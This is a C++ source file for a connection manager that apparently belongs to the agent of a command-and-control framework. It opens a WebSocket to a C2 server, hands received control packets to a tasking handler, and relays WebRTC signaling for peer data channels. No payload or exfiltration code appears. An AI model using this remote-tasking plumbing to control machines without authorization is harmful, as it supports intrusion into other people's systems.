//
// Created by alsah on 16.03.23.
//

#include "ConnectionsManager.h"
#include "CoreUtils.h"
#include <utility>


ConnectionConfig::ConnectionConfig(
        std::string connectionId,
        std::string endpoint,
        std::uint16_t sleep
        ) : connectionId(std::move(connectionId)), endpoint(std::move(endpoint)), sleep(sleep) {}

std::string ConnectionConfig::getUrl() const {
    return "ws://" + c2server + '/' + endpoint + '/' + connectionId;
}

ConnectionsManager::ConnectionsManager(ConnectionConfig config) : config(std::move(config)), peerData{} {


    C2ServerChannelConfiguration cfg( // TODO add valid handlers
            [](){
                std::cout << "c2Server channel closed" << std::endl;
                },
            [](){
                std::cout << "c2Server channel opened" << std::endl;
                },
            [this](auto data){
                handleC2ServerMessage(data);
                },
            [this](ChannelState state, std::uint64_t time){
                    if(onC2StateChange != nullptr){
                        onC2StateChange(state == ChannelState::OPENED, CoreUtils::convert(state), time);
                    }
                },
                this->config.sleep
            );
    c2ServerChannel = std::make_unique<C2ServerChannel>(cfg);
}

ConnectionsManager::~ConnectionsManager() {
    c2ServerChannel->close();
}

void ConnectionsManager::start(const std::string& c2server) {
    config.c2server = c2server;
    c2ServerChannel->open(config.getUrl(), true);
}

void ConnectionsManager::stop() {
    c2ServerChannel->close();
}

void ConnectionsManager::setTasksHandler(std::shared_ptr<IControlPacketHandler> tasksRegisterPtr) {
    this->packetsHandler = std::move(tasksRegisterPtr);
}

void ConnectionsManager::handleC2ServerMessage(std::vector<std::byte> &data) {

    msgs::NetworkMessage message{};

    bool res = message.ParseFromArray(data.data(), static_cast<int>(data.size()));

    if(!res){
        std::cout << "Failed to parse inbox network message"; // TODO: log
        return;
    }

    switch (message.data_case()) {

        case msgs::NetworkMessage::kControl:
            std::cout << "received control packet; passing to the tasks manager "  << std::endl;
            packetsHandler->handleInbox(message.control());
            break;
        case msgs::NetworkMessage::kSignaling:
            std::cout << "received signaling message" << std::endl;
            handleSignalingMessage(message.signaling());
            break;
        case msgs::NetworkMessage::DATA_NOT_SET:
            std::cout << "received undefined message; ignoring ..." << std::endl;
            return;
    }
}

void ConnectionsManager::send(const msgs::ControlPacket& data) {

    msgs::NetworkMessage message{};
    message.mutable_control()->CopyFrom(data);

    const std::string serializedString = message.SerializeAsString();
    c2ServerChannel->send(CoreUtils::convert(serializedString));
}


void ConnectionsManager::setC2StateChangeCallback(
        const std::function<void(bool, std::string, std::uint64_t)> &pOnC2StateChange) {
    this->onC2StateChange = pOnC2StateChange;
}

void ConnectionsManager::setPeerStateChangeCallback(
        const std::function<void(bool, std::string, std::uint64_t)> &pOnPeerStateChange) {
    this->onPeerStateChange = pOnPeerStateChange;
}

void ConnectionsManager::disconnectFromCurrentPeer() {
    peerData.remoteId.clear();

    if(peerData.ctrlChannel != nullptr){
        peerData.ctrlChannel->close();
        peerData.ctrlChannel = nullptr;
    }

    if(peerData.connection != nullptr){
        peerData.connection->close();
        peerData.connection->clearStats();
        peerData.connection = nullptr;
    }
}

void ConnectionsManager::connectToPeer(const std::string &peerId) {
    peerData.remoteId = peerId;
    setupPeerConnection();

    peerData.ctrlChannel = peerData.connection->createDataChannel("ctrl");
    setupCtrlDataChannel();
}



void ConnectionsManager::setupPeerConnection() {
    peerData.connection = std::make_shared<rtc::PeerConnection>(rtcConfig);

    peerData.connection->onStateChange([this](rtc::PeerConnection::State state) {
        std::cout << "SIGNALING: Called onStateChange: " << state << std::endl;

        if(onC2StateChange != nullptr){
            onPeerStateChange(
                    state == rtc::PeerConnection::State::Connected,
                    CoreUtils::convert(state),
                    std::chrono::duration_cast<std::chrono::milliseconds>(
                            std::chrono::system_clock::now().time_since_epoch()).count());
        }

        if(state == rtc::PeerConnection::State::Closed || state == rtc::PeerConnection::State::Failed){
            disconnectFromCurrentPeer();
        }
    });

    peerData.connection->onSignalingStateChange([](rtc::PeerConnection::SignalingState state){
        std::cout << "SIGNALING: Called onSignalingStateChange: " << state << std::endl;
    });

    peerData.connection->onGatheringStateChange([](rtc::PeerConnection::GatheringState state) {
        std::cout << "SIGNALING: Gathering State: " << state << std::endl;
    });

    peerData.connection->onLocalDescription([this](const rtc::Description& description) {
        msgs::NetworkMessage message{};
        auto* signalingData = message.mutable_signaling();
        signalingData->set_id(peerData.remoteId);
        signalingData->set_type(description.typeString());
        signalingData->set_description(std::string(description));

        const std::string serializedString = message.SerializeAsString();
        c2ServerChannel->send(CoreUtils::convert(serializedString));
    });

    peerData.connection->onLocalCandidate([this](const rtc::Candidate& candidate) {
        msgs::NetworkMessage message{};
        auto* signalingData = message.mutable_signaling();
        signalingData->set_id(peerData.remoteId);
        signalingData->set_type("candidate");
        signalingData->set_candidate(std::string(candidate));
        signalingData->set_mid(candidate.mid());

        const std::string serializedString = message.SerializeAsString();
        c2ServerChannel->send(CoreUtils::convert(serializedString));
    });

    peerData.connection->onDataChannel([this](const std::shared_ptr<rtc::DataChannel>& dc) {
        std::cout << "SIGNALING: DataChannel from " << peerData.remoteId << " received with label \""
                  << dc->label() << "\"" << std::endl;

        if(dc->label() == "ctrl")
        peerData.ctrlChannel = dc;
    });
}



void ConnectionsManager::handleSignalingMessage(const msgs::SignalingData& signalingData) {

    if(signalingData.id().empty()){
        std::cout << "Received signaling message has empty peer id";
        return;
    }

    if(signalingData.type().empty()){
        std::cout << "Received signaling message has empty type";
        return;
    }

/*    if(peerData.remoteId != signalingData.id() && signalingData.type() == "offer"){

        if (peerData.connection->state() == rtc::PeerConnection::State::Connected){

        }
        // TODO: ignore if connection is opened
        std::cout << "Answering to " + signalingData.id() << std::endl;
    } else {
        std::cout << "Failed to handle signaling message" + signalingData.id() << std::endl;
        return;
    }*/

    const auto& type = signalingData.type();

    if(type == "offer" && peerData.remoteId.empty()){
        peerData.remoteId = signalingData.id();

        if(peerData.connection == nullptr){
            setupPeerConnection();
        }
    }

    if (type == "offer" || type == "answer") {
        const auto& sdp = signalingData.description();
        peerData.connection->setRemoteDescription(rtc::Description(sdp, type));
    } else if (type == "candidate") {
        const auto& sdp = signalingData.candidate();
        const auto& mid = signalingData.mid();
        peerData.connection->addRemoteCandidate(rtc::Candidate(sdp, mid));
    }
}


void ConnectionsManager::setupCtrlDataChannel(){

    peerData.ctrlChannel->onOpen([this]() {
        std::cout << "SIGNALING: DataChannel from " << peerData.remoteId << " open" << std::endl;
        peerData.ctrlChannel->send("Hello from " + config.connectionId);
    });

    peerData.ctrlChannel->onError([](const std::string& error){
        std::cout << "SIGNALING: DataChannel error: " << error << std::endl;
    });

    peerData.ctrlChannel->onClosed([this]() {
        std::cout << "SIGNALING: DataChannel from " <<  peerData.remoteId << " closed" << std::endl;
    });

    peerData.ctrlChannel->onMessage([this](auto data) {
        // data holds either std::string or rtc::binary
        if (std::holds_alternative<std::string>(data))
            std::cout << "Message from " <<  peerData.remoteId << " received: " << std::get<std::string>(data)
                      << std::endl;
        else
            std::cout << "Binary message from " <<  peerData.remoteId
                      << " received, size=" << std::get<rtc::binary>(data).size() << std::endl;
    });
}